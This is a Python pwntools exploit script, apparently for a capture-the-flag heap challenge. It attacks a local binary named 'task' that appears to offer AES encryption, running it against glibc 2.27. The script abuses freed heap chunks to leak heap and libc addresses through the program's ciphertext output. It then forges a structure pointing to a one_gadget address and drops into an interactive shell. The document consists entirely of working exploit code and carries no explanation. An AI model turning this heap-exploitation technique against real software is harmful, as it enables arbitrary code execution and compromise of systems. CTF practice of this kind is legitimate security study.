from pwn import *
from Crypto.Cipher import AES
BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def DE(text):
	BS = AES.block_size  
	mode = AES.MODE_CBC
	pad = lambda s: s + (BS-len(s))*"\x00"
	pad_txt = lambda s: s + (BS - len(s) % BS) * '\x00'
	unpad = lambda s : s[0:-ord(s[-1])]
	cryptor=AES.new("A"*0x20,mode, "B"*0x10)
	plain_text  = cryptor.decrypt(text)
    	return u64(plain_text[:8])
def cmd(c):
	p.sendlineafter("Choice: ",str(c))
def add(i,size,data,key="A"*0x20,vi="B"*0x10,tp=1):
	p.sendline("1")
	p.sendlineafter("id : ",str(i))
	p.sendlineafter("2): ",str(tp))
	p.sendafter("Key : ",key.ljust(0x20,'\x00'))
	p.sendafter("IV : ",vi.ljust(0x10,'\x00'))
	p.sendlineafter("Data Size : ",str(size))
	p.sendafter("Data : ",data.ljust(size,'\x00'))
def free(i,):
	cmd(2)
	p.sendlineafter("id : ",str(i))
def go(i):
	cmd(3)
	p.sendlineafter("id : ",str(i))
p=process("./task",env={'LD_PRELOAD':"./libc-2.27.so"})

add(0,0x8,"A")
add(1,0x8,"B")
add(2,0x8,"C")
add(3,0x8,"D")
add(4,0x8,"E")

free(0)
free(1)
go(2)
free(2)
free(3)
free(4)
#add(5,8,"A")
add(5,0xa8,"B")
add(6,0x8,"c")
p.readuntil("Ciphertext: \n")
pd=""
for x in  p.readline().split():
	pd+=chr(int("0x"+x,16))
heap=(DE(pd))-(0x555555758280-0x0000555555757000)
log.info(hex(heap))
sleep(2)
add(7,0x666,"A")
add(8,0x8,"A")
go(7)
free(7)
free(8)
#get the struct of index7
add(9,0x78,p64(0x555555758f80-0x0000555555757000+heap)+p64(8)+p32(1)+"A"*0x20+"B"*0x10+"\x00"*0x14+p64(0x0000555555758300-0x0000555555757000+heap)+p64(0x00005555557589a0))
p.readuntil("Ciphertext: \n")
pd=""
for x in  p.readline().split():
	pd+=chr(int("0x"+x,16))
libc=ELF("./libc-2.27.so")
base=(DE(pd))-(0x7ffff776dca0-0x7ffff73d1440+libc.symbols['system'])
log.warning(hex(base))
sleep(2)
add(10,0x8,'A')
add(10,0x8,'A')
add(10,0x8,'A')
add(10,0x8,'A')

add(0,0x8,"A")
add(1,0x8,"B")
add(2,0x8,"C")
add(3,0x8,"D")
add(4,0x8,"E")

free(0)
free(1)
go(2)
free(2)
free(3)
free(4)
add(5,0x8,"B")
one=0x10a38c
add(6,0xa8,p64(0x555555759b90)+p64(0x1)+p64(0x1)+'\x00'*0x8+p64(one+base))
p.interactive()
